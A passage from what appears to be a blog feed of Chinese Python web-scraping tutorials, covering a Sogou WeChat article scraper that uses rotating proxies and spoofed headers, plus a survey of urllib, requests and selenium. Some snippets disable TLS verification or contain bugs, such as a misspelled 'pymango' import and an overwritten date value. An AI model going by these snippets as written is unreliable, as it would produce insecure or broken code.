MongoDB 数据库</p><blockquote><p><strong>注意点：</strong></p><p>我们直接看浏览器的地址栏我们能看到很多的参数，但是实际上很大一部分是不需要的，那么为了我们的写代码的方便，我们尽量对参数进行简化，只留下最核心的参数</p></blockquote><h3 id="2-代码实现-3"><a href="#2-代码实现-3" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>config.py</strong></p><pre><code># 数据库配置MONGO_URL = &apos;localhost&apos;MONGO_DB = &apos;weixin&apos;MONGO_TABLE = &apos;articles&apos;#参数设置KEYWORD = &apos;风景&apos;MAX_COUNT = 5BASE_URL = &apos;https://weixin.sogou.com/weixin?&apos;#代理设置APP_KEY = &quot;&quot;IP_PORT = &apos;transfer.mogumiao.com:9001&apos;PROXIES = {&quot;http&quot;: &quot;http://&quot; + IP_PORT, &quot;https&quot;: &quot;https://&quot; + IP_PORT}HEADERS = {    &apos;Cookie&apos;:&apos;&apos;,    &apos;Host&apos;:&apos;weixin.sogou.com&apos;,    &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;,    &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&apos;,    &apos;Proxy-Authorization&apos;: &apos;Basic &apos;+ APP_KEY,    &apos;Referer&apos;:&apos;https://weixin.sogou.com/weixin&apos;}</code></pre><p><strong>spider.py</strong></p><pre><code>from urllib.parse import urlencodeimport requestsfrom pyquery import PyQuery as pqimport reimport pymongofrom config import *#数据库连接对象client = pymongo.MongoClient(MONGO_URL)db = client[MONGO_DB]def get_html(url,count=1):    global MAX_COUNT    if count &gt;= MAX_COUNT:        print(&apos;Tried too many counts&apos;)        return None    try:        res = requests.get(url,allow_redirects=False,headers=HEADERS,verify=False,proxies=PROXIES,timeout = 30)        print(res.status_code)        if res.status_code == 200:            return res.text        if res.status_code == 302:            return get_html(url)    except ConnectionError as e:        print(&apos;Error Occurred&apos;,e.args)        count += 1        return get_html(url,count)def get_index(keyword,page):    data = {        &apos;query&apos;:keyword,        &apos;type&apos;:2,        &apos;page&apos;:page,    }    queries = urlencode(data)    url = BASE_URL + queries    html = get_html(url)    return htmldef parse_index(html):    doc = pq(html)    items = doc(&apos;.news-box .news-list li .txt-box h3 a&apos;).items()    for item in items:        yield item.attr(&apos;data-share&apos;)def get_detail(url):    try:        res = requests.get(url)        if res.status_code == 200:            return res.text        return None    except ConnectionError:        return Nonedef parse_detail(html):    try:        #print(html)        doc = pq(html)        title = doc(&apos;.rich_media_title&apos;).text()        #date 是使用 js 变量动态加载的，我们需要使用正则匹配 js 变量        date = re.search(&apos;var publish_time = &quot;(.*?)&quot;&apos;,html)        if date:            date = date.group(1)        date = None        nickname = doc(&apos;#js_name&apos;).text()        wechat = doc(&apos;#js_profile_qrcode &gt; div &gt; p:nth-child(3) &gt; span&apos;).text()        return {            &apos;title&apos;:title,            &apos;date&apos;:date,            &apos;nickname &apos;:nickname ,            &apos;wechat&apos;:wechat,        }    except ConnectionError:        return Nonedef save_to_mongo(data):    #这里使用更新的方法，如果标题重复就不在重新插入直接更新    if db[MONGO_TABLE].update({&apos;title&apos;:data[&apos;title&apos;]},{&apos;$set&apos;:data},True):        print(&apos;Save to MongoDB&apos;,data[&apos;title&apos;])    else:        print(&apos;Save to MongoDB Failed&apos;,data[&apos;title&apos;])def main():    for page in range(1,101):        html = get_index(KEYWORD,page)        if html:            urls = parse_index(html)            for url in urls:                html = get_detail(url)                if html:                    article_data = parse_detail(html)                    save_to_mongo(article_data)if __name__ == &apos;__main__&apos;:    main()</code></pre><h3 id="3-运行效果-3"><a href="#3-运行效果-3" class="headerlink" title="3.运行效果"></a><strong>3.运行效果</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%9813.png" alt="此处输入图片的描述"></p><h2 id="0X06-参考"><a href="#0X06-参考" class="headerlink" title="0X06 参考"></a><strong>0X06 参考</strong></h2><p><a href="https://blog.csdn.net/weixin_37972723/article/details/80726475" target="_blank" rel="noopener">https://blog.csdn.net/weixin_37972723/article/details/80726475</a><br><a href="https://www.jianshu.com/p/7690edfe9ba5" target="_blank" rel="noopener">https://www.jianshu.com/p/7690edfe9ba5</a><br><a href="https://blog.csdn.net/brucewong0516/article/details/82697935" target="_blank" rel="noopener">https://blog.csdn.net/brucewong0516/article/details/82697935</a><br><a href="https://www.cnblogs.com/c-x-a/p/9248906.html" target="_blank" rel="noopener">https://www.cnblogs.com/c-x-a/p/9248906.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X01-Requests-正则爬取网页数据&quot;&gt;&lt;a href=&quot;#0X01-Requests-正则爬取网页数据&quot; class=&quot;headerlink&quot; title=&quot;0X01 Requests+正则爬取网页数据&quot;&gt;&lt;/a&gt;&lt;strong&gt;0X01 Requests+正则爬取网页数据&lt;/strong&gt;&lt;/h2&gt;&lt;h3 id=&quot;1-分析网页确定思路&quot;&gt;&lt;a href=&quot;#1-分析网页确定思路&quot; class=&quot;headerlink&quot; title=&quot;1.分析网页确定思路&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.分析网页确定思路&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;这一节打算爬取猫眼电影的 top 100 的电影信息，我们首先可以访问一下我们需要爬取的网站，看一下我们需要的信息所处的位置和结构如何&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%981_.png&quot; alt=&quot;此处输入图片的描述&quot;&gt;&lt;/p&gt;
&lt;p&gt;看完以后我们的思路应该就比较清晰了，我们首先使用 requests 库请求单页内容，然后我们使用正则对我们需要的信息进行匹配，然后将我们需要的每一条信息保存成一个JSON 字符串，并将其存入文件当中，然后就是开启循环遍历十页的内容或者采用 Python 多线程的方式提高爬取速度&lt;/p&gt;
    
    </summary>
    
      <category term="备忘" scheme="https://www.k0rz3n.com/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="爬虫" scheme="https://www.k0rz3n.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>Python3 爬虫知识梳理(基础篇)</title>
    <link href="https://www.k0rz3n.com/2019/05/03/Python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E5%9F%BA%E7%A1%80%E7%AF%87)/"/>
    <id>https://www.k0rz3n.com/2019/05/03/Python3 爬虫知识梳理(基础篇)/</id>
    <published>2019-05-03T08:49:18.000Z</published>
    <updated>2019-05-03T08:53:46.206Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0X01-常用的-python-库"><a href="#0X01-常用的-python-库" class="headerlink" title="0X01 常用的 python 库"></a><strong>0X01 常用的 python 库</strong></h2><h3 id="1-urllib"><a href="#1-urllib" class="headerlink" title="1.urllib"></a><strong>1.urllib</strong></h3><pre><code>import urllibimport urllib.requesturllib.request.urlopen(&quot;http://www.baidu.com&quot;)</code></pre><h3 id="2-re"><a href="#2-re" class="headerlink" title="2.re"></a><strong>2.re</strong></h3><h3 id="3-requests"><a href="#3-requests" class="headerlink" title="3.requests"></a><strong>3.requests</strong></h3><h3 id="4-selenimu"><a href="#4-selenimu" class="headerlink" title="4.selenimu"></a><strong>4.selenimu</strong></h3><p>这个库是配合一些驱动去爬取动态渲染网页的库</p><a id="more"></a><h4 id="1-chromedriver"><a href="#1-chromedriver" class="headerlink" title="(1)chromedriver"></a><strong>(1)chromedriver</strong></h4><p>我们使用的时候需要先下载一个 <a href="http://npm.taobao.org/mirrors/chromedriver/2.46/" target="_blank" rel="noopener">chromedriver.exe</a> ，下载好了以后放在 chrome.exe 的相同目录下（默认安装路径），然后将这个目录放作为 PATH</p><pre><code>import seleniumfrom selenium import webdriverdriver = webdriver.Chrome()driver.get(&quot;http://www.baidu.com&quot;)driver.page_source</code></pre><p>这种方式的唯一的缺点是会出现浏览器界面，这可能是我们不需要的,所以我们可以使用 headless 的方式来隐藏 web 界面(其实就是使用 options() 对象的 add_argument 属性去设置 headless 参数 )</p><pre><code>import osfrom selenium import webdriverfrom selenium.webdriver.common.keys import Keysfrom selenium.webdriver.chrome.options import Optionsimport timechrome_options = Options()chrome_options.add_argument(&quot;--headless&quot;)base_url = &quot;http://www.baidu.com/&quot;#对应的chromedriver的放置目录driver = webdriver.Chrome(executable_path=(r&apos;C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe&apos;), chrome_options=chrome_options)driver.get(base_url + &quot;/&quot;)start_time=time.time()print(&apos;this is start_time &apos;,start_time)driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;selenium webdriver&quot;)driver.find_element_by_id(&quot;su&quot;).click()driver.save_screenshot(&apos;screen.png&apos;)driver.close()end_time=time.time()print(&apos;this is end_time &apos;,end_time)</code></pre><h4 id="2-phantomJS"><a href="#2-phantomJS" class="headerlink" title="(2)phantomJS"></a><strong>(2)phantomJS</strong></h4><p>这是另一种无界面的实现方法，虽然说不维护了，并且在使用的过程中会出现各种玄学，但是还是要介绍一下</p><p>和 Chromedriver 一样，我们首先要去<a href="http://phantomjs.org/download.html" target="_blank" rel="noopener">下载</a> phantomJS,然后将其放在 PATH 中方便我们后面的调用</p><pre><code>import seleniumfrom selenium import webdriverdriver = webdriver.phantomJS()driver.get(&quot;http://www.baidu.com&quot;)driver.page_source</code></pre><h3 id="5-lxml"><a href="#5-lxml" class="headerlink" title="5.lxml"></a><strong>5.lxml</strong></h3><p>这个是为 XPATH 的使用准备的库</p><h3 id="6-beautifulsoup"><a href="#6-beautifulsoup" class="headerlink" title="6.beautifulsoup"></a><strong>6.beautifulsoup</strong></h3><p>pip 安装的时候注意一下要安装 beautifulsoup4,表示第四个版本，并且这个库是依赖于 lxml 的，所以安装之前请先安装 lxml </p><pre><code>from bs4 import BeautifulSoupsoup = BeautifulSoup(&apos;`&lt;html&gt;&lt;/html&gt;&apos;,&apos;lxml&apos;)</code></pre><h3 id="7-pyquery"><a href="#7-pyquery" class="headerlink" title="7.pyquery"></a><strong>7.pyquery</strong></h3><p>和 BeautifulSoup 一样也是一个网页解析库，但是相对来讲语法简单一些（语法是模仿 jQuery 的）</p><pre><code>from pyquery import PyQuery as pqpage = pq(&apos;`&lt;html&gt;hello world&lt;/html&gt;`&apos;)result = page(&apos;html&apos;).text()result</code></pre><h3 id="8-pymysql"><a href="#8-pymysql" class="headerlink" title="8.pymysql"></a><strong>8.pymysql</strong></h3><p>这个库是 py 操纵 Mysql 的库</p><pre><code>import pymysqlconn = pymysql.connect(host=&apos;localhost&apos;,user=&apos;root&apos;,password=&apos;root&apos;,port=3306,db=&apos;test&apos;)cursor = conn.cursor()result = cursor.execute(&apos;select * from user where id = 1&apos;)print(cursor.fetchone())</code></pre><h3 id="9-pymango"><a href="#9-pymango" class="headerlink" title="9.pymango"></a><strong>9.pymango</strong></h3><pre><code>import pymangoclient = pymango.MongoClient(&apos;localhost&apos;)db = client(&apos;newtestdb&apos;)db[&apos;table&apos;].insert({&apos;name&apos;:&apos;Bob&apos;})db[&apos;table&apos;].find_one({&apos;name&apos;:&apos;Bob&apos;})</code></pre><h3 id="10-redis"><a href="#10-redis" class="headerlink" title="10.redis"></a><strong>10.redis</strong></h3><pre><code>import redisr = redis.Redis(&apos;localhost&apos;,6379)r.set(&quot;name&quot;,&quot;Bob&quot;)r.get(&apos;name&apos;)</code></pre><h3 id="11-flask"><a href="#11-flask" class="headerlink" title="11.flask"></a><strong>11.flask</strong></h3><p>flask 在后期使用代理的时候可能会用到</p><pre><code>from flask import Flaskapp = Flask(__name__)@app.route(&apos;/&apos;)def hello():    return &quot;hello world&quot;if __name__ == &apos;__main__&apos;:    app.run(debug=True)</code></pre><h3 id="12-django"><a href="#12-django" class="headerlink" title="12.django"></a><strong>12.django</strong></h3><p>在分布式爬虫的维护方面可能会用到 django </p><h3 id="13-jupyter"><a href="#13-jupyter" class="headerlink" title="13.jupyter"></a><strong>13.jupyter</strong></h3><p>网页端记事本</p><h2 id="0X02-基础部分"><a href="#0X02-基础部分" class="headerlink" title="0X02 基础部分"></a><strong>0X02 基础部分</strong></h2><h3 id="1-爬虫基本原理"><a href="#1-爬虫基本原理" class="headerlink" title="1.爬虫基本原理"></a><strong>1.爬虫基本原理</strong></h3><h4 id="1-爬虫是什么"><a href="#1-爬虫是什么" class="headerlink" title="(1)爬虫是什么"></a><strong>(1)爬虫是什么</strong></h4><p>爬虫就是请求网页并且提取数据的自动化工具</p><h4 id="2-爬虫的基本流程"><a href="#2-爬虫的基本流程" class="headerlink" title="(2)爬虫的基本流程"></a><strong>(2)爬虫的基本流程</strong></h4><h5 id="1-发起请求："><a href="#1-发起请求：" class="headerlink" title="1.发起请求："></a><strong>1.发起请求：</strong></h5><p>通过 HTTP 库向目标网站发起请求，即发送一个 request（可以包含额外的header信息），然后等待服务器的响应</p><h5 id="2-获取响应内容"><a href="#2-获取响应内容" class="headerlink" title="2.获取响应内容"></a><strong>2.获取响应内容</strong></h5><p>如果服务器正常响应，会得到一个 Response.其内容就是所要获取的页面的内容，类型可以是 HTML、JSON、二进制数据(图片视频)等</p><h5 id="3-解析内容"><a href="#3-解析内容" class="headerlink" title="3.解析内容"></a><strong>3.解析内容</strong></h5><p>对 HTML 数据可以使用正则表达式、网页解析库进行解析。如果是 Json 则可以转化成 JSON 对象解析，如果是二进制数据可以保存或者进一步处理</p><h5 id="4-保存数据"><a href="#4-保存数据" class="headerlink" title="4.保存数据"></a><strong>4.保存数据</strong></h5><p>保存的形式多样，可以是纯文本，也可以保存成数据库，或者保存为特定格式的文件</p><h4 id="3-请求的基本元素"><a href="#3-请求的基本元素" class="headerlink" title="(3)请求的基本元素"></a><strong>(3)请求的基本元素</strong></h4><p>1.请求方法<br>2.请求 URL<br>3.请求头<br>4.请求体(POST 方法独有)</p><h4 id="4-请响应的基本元素"><a href="#4-请响应的基本元素" class="headerlink" title="(4)请响应的基本元素"></a><strong>(4)请响应的基本元素</strong></h4><p>1.状态码<br>2.响应头<br>3.响应体</p><h4 id="5-实例代码："><a href="#5-实例代码：" class="headerlink" title="(5)实例代码："></a><strong>(5)实例代码：</strong></h4><h5 id="1-请求网页数据"><a href="#1-请求网页数据" class="headerlink" title="1.请求网页数据"></a><strong>1.请求网页数据</strong></h5><pre><code>import requestsheaders = {&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&apos;}res = requests.get(&quot;http://www.baidu.com&quot;,headers=headers)print(res.status_code)print(res.headers)print(res.text)</code></pre><p>当然这里使用的是 res.text 这种文本格式，如果返回的是一个二进制格式的数据(比如图片)，那么我们应该使用 res.content</p><h5 id="2-请求二进制数据"><a href="#2-请求二进制数据" class="headerlink" title="2.请求二进制数据"></a><strong>2.请求二进制数据</strong></h5><pre><code>import requestsheaders = {&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&apos;}res = requests.get(&quot;https://ss2.bdstatic.com/lfoZeXSm1A5BphGlnYG/icon/95486.png&quot;,headers=headers)print(res.content)with open(r&apos;E:\桌面\1.png&apos;,&apos;wb&apos;) as f:    f.write(res.content)    f.close()</code></pre><h4 id="6-解析方式"><a href="#6-解析方式" class="headerlink" title="(6)解析方式"></a><strong>(6)解析方式</strong></h4><p>1.直接处理<br>2.转化成 json对象<br>3.正则匹配<br>4.BeautifulSoap<br>5.PyQuery<br>6.XPath</p><h4 id="7-response-的结果为什么和浏览器中的看到的不同"><a href="#7-response-的结果为什么和浏览器中的看到的不同" class="headerlink" title="(7)response 的结果为什么和浏览器中的看到的不同"></a><strong>(7)response 的结果为什么和浏览器中的看到的不同</strong></h4><p>我们使用脚本去请求(只是一次请求)网页得到的是最原始的网页的源码，这个源码里面会有很多的远程的 js 和 css 的加载，我们的脚本是没法解析的，但是浏览器能对这些远程的链接进行再次的请求，然后利用加载到的数据对页面进行进一步的加载和渲染，于是我们在浏览器中看到的页面是很多请求渲染得到的结果，因此和我们一次请求的到的页面肯定是不一样的。</p><h4 id="8-如何解决-JS-渲染的问题"><a href="#8-如何解决-JS-渲染的问题" class="headerlink" title="(8)如何解决 JS 渲染的问题"></a><strong>(8)如何解决 JS 渲染的问题</strong></h4><p>解决问题的方法本质上就是模拟浏览器的加载渲染，然后将渲染好的页面进行返回</p><p>1.分析Ajax 请求<br>2.selenium+webdriver(推荐)<br>3.splash<br>4.PyV8、Ghostpy</p><h4 id="9-如何存储数据"><a href="#9-如何存储数据" class="headerlink" title="(9)如何存储数据"></a><strong>(9)如何存储数据</strong></h4><p>1.纯本文<br>2.关系型数据库<br>3.非关系型数据库<br>4.二进制文件</p><h2 id="0X03-Urllib-库"><a href="#0X03-Urllib-库" class="headerlink" title="0X03 Urllib 库"></a><strong>0X03 Urllib 库</strong></h2><h3 id="1-什么是-Urllib-库"><a href="#1-什么是-Urllib-库" class="headerlink" title="1.什么是 Urllib 库"></a><strong>1.什么是 Urllib 库</strong></h3><p>这个库是 python 的内置的一个请求库</p><p>urllib.request —————–&gt;请求模块<br>urllib.error——————–&gt;异常处理模块<br>urllib.parse——————–&gt;url解析模块<br>urllib.robotparser  ————&gt;robots.txt 解析模块</p><h3 id="2-urllib-库的基本使用"><a href="#2-urllib-库的基本使用" class="headerlink" title="2.urllib 库的基本使用"></a><strong>2.urllib 库的基本使用</strong></h3><h4 id="1-函数调用原型"><a href="#1-函数调用原型" class="headerlink" title="(1)函数调用原型"></a><strong>(1)函数调用原型</strong></h4><pre><code>urllib.request.urlopen(url,data,timeout...)</code></pre><h4 id="2-实例代码一：GET-请求"><a href="#2-实例代码一：GET-请求" class="headerlink" title="(2)实例代码一：GET 请求"></a><strong>(2)实例代码一：GET 请求</strong></h4><pre><code>import urllib.requestres = urllib.request.urlopen(&quot;http://www.baidu.com&quot;)print(res.read().decode(&apos;utf-8&apos;))</code></pre><h4 id="3-实例代码二：POST-请求"><a href="#3-实例代码二：POST-请求" class="headerlink" title="(3)实例代码二：POST 请求"></a><strong>(3)实例代码二：POST 请求</strong></h4><pre><code>import urllib.requestimport urllib.parsefrom pprint import pprintdata = bytes(urllib.parse.urlencode({&apos;world&apos;:&apos;hello&apos;}),encoding = &apos;utf8&apos;)res = urllib.request.urlopen(&apos;https://httpbin.org/post&apos;,data = data)pprint(res.read().decode(&apos;utf-8&apos;))</code></pre><h4 id="4-实例代码三：超时设置"><a href="#4-实例代码三：超时设置" class="headerlink" title="(4)实例代码三：超时设置"></a><strong>(4)实例代码三：超时设置</strong></h4><pre><code>import urllib.requestres = urllib.request.urlopen(&quot;http://httpbin.org.get&quot;,timeout = 1)print(res.read().decode(&apos;utf-8&apos;))</code></pre><h4 id="5-实例代码：获取响应状态码、响应头、响应体"><a href="#5-实例代码：获取响应状态码、响应头、响应体" class="headerlink" title="(5)实例代码：获取响应状态码、响应头、响应体"></a><strong>(5)实例代码：获取响应状态码、响应头、响应体</strong></h4><pre><code>import urllib.requestres = urllib.request.urlopen(&quot;http://httpbin.org/get&quot;)print(res.status)print(res.getheaders())print(res.getheader(&apos;Server&apos;))#获取响应体的使用 read() 的结果是 Bytes 类型，我们还要用 decode(&apos;utf-8&apos;)转化成字符串print(res.read().decode(&apos;utf-8&apos;))</code></pre><h4 id="6-request-对象"><a href="#6-request-对象" class="headerlink" title="(6) request 对象"></a><strong>(6) request 对象</strong></h4><pre><code>from urllib import request,parsefrom pprint import pprinturl = &quot;https://httpbin.org/post&quot;headers = {    &apos;User-Agent&apos;:&apos;hello wolrd&apos;,    &apos;Host&apos;:&apos;httpbin.org&apos;}dict = {    &apos;name&apos;:&apos;Tom&apos;,}data = bytes(parse.urlencode(dict),encoding=&apos;utf8&apos;)req = request.Request(url=url,data=data,headers=headers,method=&apos;POST&apos;)res = request.urlopen(req)pprint(res.read().decode(&apos;utf-8&apos;))</code></pre><h3 id="3-urllib-库的进阶使用"><a href="#3-urllib-库的进阶使用" class="headerlink" title="3.urllib 库的进阶使用"></a><strong>3.urllib 库的进阶使用</strong></h3><h4 id="1-代理"><a href="#1-代理" class="headerlink" title="(1)代理"></a><strong>(1)代理</strong></h4><pre><code>import urllib.requestproxy_handler = urllib.request.ProxyHandler({    &apos;http&apos;:&apos;http://127.0.0.1:9743&apos;})opener = urllib.request.build_opener(proxy_handler)res = opener.open(&apos;https://www.taobao.com&apos;)print(res.read())</code></pre><h4 id="2-Cookie"><a href="#2-Cookie" class="headerlink" title="(2)Cookie"></a><strong>(2)Cookie</strong></h4><h5 id="1-获取-cookies"><a href="#1-获取-cookies" class="headerlink" title="1.获取 cookies"></a><strong>1.获取 cookies</strong></h5><pre><code>import http.cookiejarimport urllib.requestcookie = http.cookiejar.CookieJar()handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&quot;http://www.baidu.com&quot;)for item in cookie:    print(item.name+&quot;=&quot;+item.value)</code></pre><h5 id="2-将-cookie-保存成文本文件"><a href="#2-将-cookie-保存成文本文件" class="headerlink" title="2.将 cookie 保存成文本文件"></a><strong>2.将 cookie 保存成文本文件</strong></h5><p><strong>格式一：</strong></p><pre><code>import http.cookiejar, urllib.requestfilename = &quot;cookie.txt&quot;cookie = http.cookiejar.MozillaCookieJar(filename)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&apos;http://www.baidu.com&apos;)cookie.save(ignore_discard=True, ignore_expires=True)</code></pre><p><strong>格式二：</strong></p><pre><code>import http.cookiejar, urllib.requestfilename = &apos;cookie.txt&apos;cookie = http.cookiejar.LWPCookieJar(filename)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&apos;http://www.baidu.com&apos;)cookie.save(ignore_discard=True, ignore_expires=True)</code></pre><h5 id="3-使用文件中的-cookie"><a href="#3-使用文件中的-cookie" class="headerlink" title="3.使用文件中的 cookie"></a><strong>3.使用文件中的 cookie</strong></h5><pre><code>import http.cookiejar, urllib.requestcookie = http.cookiejar.LWPCookieJar()cookie.load(&apos;cookie.txt&apos;, ignore_discard=True, ignore_expires=True)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&apos;http://www.baidu.com&apos;)print(response.read().decode(&apos;utf-8&apos;))</code></pre><h4 id="3-异常处理"><a href="#3-异常处理" class="headerlink" title="(3)异常处理"></a><strong>(3)异常处理</strong></h4><h5 id="1-实例代码一：URLError"><a href="#1-实例代码一：URLError" class="headerlink" title="1.实例代码一：URLError"></a><strong>1.实例代码一：URLError</strong></h5><pre><code>from urllib import requestfrom urllib import errortry:    urllib.request.urlopen(&quot;http://httpbin.org/xss&quot;)except error.URLError as e:    print(e.reason)</code></pre><h5 id="2-实例代码二：HTTPError"><a href="#2-实例代码二：HTTPError" class="headerlink" title="2.实例代码二：HTTPError"></a><strong>2.实例代码二：HTTPError</strong></h5><pre><code>from urllib import request, errortry:    response = request.urlopen(&apos;http://httpbin.org/xss&apos;)except error.HTTPError as e:    print(e.reason, e.code, e.headers, sep=&apos;\n&apos;)except error.URLError as e:    print(e.reason)else:    print(&apos;Request Successfully&apos;)</code></pre><h5 id="3-实例代码三：异常类型判断"><a href="#3-实例代码三：异常类型判断" class="headerlink" title="3.实例代码三：异常类型判断"></a><strong>3.实例代码三：异常类型判断</strong></h5><pre><code>import socketimport urllib.requestimport urllib.errortry:    response = urllib.request.urlopen(&apos;https://www.baidu.com&apos;, timeout=0.01)except urllib.error.URLError as e:    print(type(e.reason))    if isinstance(e.reason, socket.timeout):        print(&apos;TIME OUT&apos;)</code></pre><h4 id="4-URL-解析工具类"><a href="#4-URL-解析工具类" class="headerlink" title="(4)URL 解析工具类"></a><strong>(4)URL 解析工具类</strong></h4><h5 id="1-urlparse"><a href="#1-urlparse" class="headerlink" title="1.urlparse"></a><strong>1.urlparse</strong></h5><pre><code>from urllib.parse import urlparseresult = urlparse(&apos;http://www.baidu.com/index.html;user?id=5#comment&apos;)print(type(result), result)</code></pre><h5 id="2-urlunparse"><a href="#2-urlunparse" class="headerlink" title="2.urlunparse"></a><strong>2.urlunparse</strong></h5><pre><code>from urllib.parse import urlunparsedata = [&apos;http&apos;, &apos;www.baidu.com&apos;, &apos;index.html&apos;, &apos;user&apos;, &apos;a=6&apos;, &apos;comment&apos;]print(urlunparse(data))</code></pre><h5 id="3-urljoin"><a href="#3-urljoin" class="headerlink" title="3.urljoin"></a><strong>3.urljoin</strong></h5><pre><code>from urllib.parse import urljoinprint(urljoin(&apos;http://www.baidu.com&apos;, &apos;FAQ.html&apos;))</code></pre><h5 id="4-urlencode"><a href="#4-urlencode" class="headerlink" title="4.urlencode"></a><strong>4.urlencode</strong></h5><pre><code>from urllib.parse import urlencodeparams = {    &apos;name&apos;: &apos;germey&apos;,    &apos;age&apos;: 22}base_url = &apos;http://www.baidu.com?&apos;url = base_url + urlencode(params)print(url)</code></pre><h2 id="0X04-Requests-库"><a href="#0X04-Requests-库" class="headerlink" title="0X04 Requests 库"></a><strong>0X04 Requests 库</strong></h2><h3 id="1-什么是-requests-库"><a href="#1-什么是-requests-库" class="headerlink" title="1.什么是 requests 库"></a><strong>1.什么是 requests 库</strong></h3><p>这个库是基于 URLlib3 的，改善了 urllib api 比较繁琐的特点，使用几句简单的语句就能实现设置 cookie 和设置代理的功能，非常的方便</p><h3 id="2-requests-库的基本使用"><a href="#2-requests-库的基本使用" class="headerlink" title="2.requests 库的基本使用"></a><strong>2.requests 库的基本使用</strong></h3><h4 id="1-获取响应信息"><a href="#1-获取响应信息" class="headerlink" title="(1)获取响应信息"></a><strong>(1)获取响应信息</strong></h4><pre><code>import requestsres = requests.get(&quot;http://www.baidu.com&quot;)print(res.status_code)print(res.text)print(res.cookies)</code></pre><h4 id="2-各种请求方法"><a href="#2-各种请求方法" class="headerlink" title="(2)各种请求方法"></a><strong>(2)各种请求方法</strong></h4><pre><code>import requestsrequests.get(&quot;http://httpbin.org/get&quot;)requests.post(&quot;http://httpbin.org/post&quot;)requests.put(&quot;http://httpbin.org/put&quot;)requests.head(&quot;http://httpbin.org/get&quot;)requests.delete(&quot;http://httpbin.org/delete&quot;)requests.options(&quot;http://httpbin.org/get&quot;)</code></pre><h4 id="3-带参数的-get-请求"><a href="#3-带参数的-get-请求" class="headerlink" title="(3)带参数的 get 请求"></a><strong>(3)带参数的 get 请求</strong></h4><pre><code>import requestsparams = {    &apos;id&apos;:1,    &apos;user&apos;:&apos;Tom&apos;,    &apos;pass&apos;:&apos;123456&apos;}res = requests.get(&apos;http://httpbin.org/get&apos;,params = params )print(res.text)</code></pre><h4 id="4-解析-json"><a href="#4-解析-json" class="headerlink" title="(4)解析 json"></a><strong>(4)解析 json</strong></h4><pre><code>import requestsres = requests.get(&quot;http://httpbin.org/get&quot;)print(res.json())</code></pre><h4 id="5-获取二进制数据"><a href="#5-获取二进制数据" class="headerlink" title="(5)获取二进制数据"></a><strong>(5)获取二进制数据</strong></h4><pre><code>import requestsresponse = requests.get(&quot;https://github.com/favicon.ico&quot;)with open(&apos;favicon.ico&apos;, &apos;wb&apos;) as f:    f.write(response.content)    f.close()</code></pre><h4 id="6-添加-headers"><a href="#6-添加-headers" class="headerlink" title="(6)添加 headers"></a><strong>(6)添加 headers</strong></h4><pre><code>import requestsheaders = {    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&apos;}response = requests.get(&quot;https://www.zhihu.com/explore&quot;, headers=headers)print(response.text)</code></pre><h4 id="7-POST-请求"><a href="#7-POST-请求" class="headerlink" title="(7)POST 请求"></a><strong>(7)POST 请求</strong></h4><pre><code>import requestsdata = {    &apos;id&apos;:1,    &apos;user&apos;:&apos;Tom&apos;,    &apos;pass&apos;:&apos;123456&apos;,}res = requests.post(&apos;http://httpbin.org/post&apos;,data=data)print(res.text)</code></pre><h4 id="8-response-属性"><a href="#8-response-属性" class="headerlink" title="(8) response 属性"></a><strong>(8) response 属性</strong></h4><pre><code>import requestsdata = {    &apos;id&apos;:1,    &apos;user&apos;:&apos;Tom&apos;,    &apos;pass&apos;:&apos;123456&apos;,}res = requests.post(&apos;http://httpbin.org/post&apos;,data=data)print(res.text)print(res.status_code)print(res.headers)print(res.cookies)print(res.history)print(res.url)</code></pre><h4 id="9-响应状态码"><a href="#9-响应状态码" class="headerlink" title="(9)响应状态码"></a><strong>(9)响应状态码</strong></h4><p>每一个状态码都对应着一个名字，我们只要调用这个名字就可以进行判断了</p><pre><code>100: (&apos;continue&apos;,),101: (&apos;switching_protocols&apos;,),102: (&apos;processing&apos;,),103: (&apos;checkpoint&apos;,),122: (&apos;uri_too_long&apos;, &apos;request_uri_too_long&apos;),200: (&apos;ok&apos;, &apos;okay&apos;, &apos;all_ok&apos;, &apos;all_okay&apos;, &apos;all_good&apos;, &apos;\\o/&apos;, &apos;✓&apos;),201: (&apos;created&apos;,),202: (&apos;accepted&apos;,),203: (&apos;non_authoritative_info&apos;, &apos;non_authoritative_information&apos;),204: (&apos;no_content&apos;,),205: (&apos;reset_content&apos;, &apos;reset&apos;),206: (&apos;partial_content&apos;, &apos;partial&apos;),207: (&apos;multi_status&apos;, &apos;multiple_status&apos;, &apos;multi_stati&apos;, &apos;multiple_stati&apos;),208: (&apos;already_reported&apos;,),226: 